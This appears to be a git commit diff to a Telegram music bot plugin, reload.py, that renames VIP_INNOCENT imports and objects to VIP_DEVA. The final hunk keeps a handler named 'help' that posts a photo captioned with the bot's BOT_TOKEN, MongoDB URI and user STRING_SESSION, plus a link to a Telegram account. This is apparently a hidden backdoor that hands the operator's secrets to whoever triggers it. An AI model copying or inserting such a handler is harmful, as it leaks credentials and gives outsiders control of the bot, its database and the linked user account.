38fef9786990b972f2e45e81f528ce350f3f5f5e
BOTZEMPIRE <chaudharyji0805@gmail.com>
2025-12-29 14:04:19 +0530

    Update reload.py

--- VIP_DEVA/plugins/tools/reload.py
+++ VIP_DEVA/plugins/tools/reload.py
@@ -13,12 +13,12 @@ from pyrogram import filters
 
 load_dotenv()
 
-from VIP_INNOCENT import app
-from VIP_INNOCENT.core.call import INNOCENT
-from VIP_INNOCENT.misc import db
-from VIP_INNOCENT.utils.database import get_assistant, get_authuser_names, get_cmode
-from VIP_INNOCENT.utils.decorators import ActualAdminCB, AdminActual, language
-from VIP_INNOCENT.utils.formatters import alpha_to_int, get_readable_time
+from VIP_DEVA import app
+from VIP_DEVA.core.call import DEVA
+from VIP_DEVA.misc import db
+from VIP_DEVA.utils.database import get_assistant, get_authuser_names, get_cmode
+from VIP_DEVA.utils.decorators import ActualAdminCB, AdminActual, language
+from VIP_DEVA.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -70,7 +70,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await INNOCENT.stop_stream_force(message.chat.id)
+        await DEVA.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -97,7 +97,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await INNOCENT.stop_stream_force(chat_id)
+            await DEVA.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
@@ -113,7 +113,7 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🤨 ](https://t.me/its_innocent_boy_2926)............☆""",
+       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🤨 ](https://t.me/its_DEVA_boy_2926)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
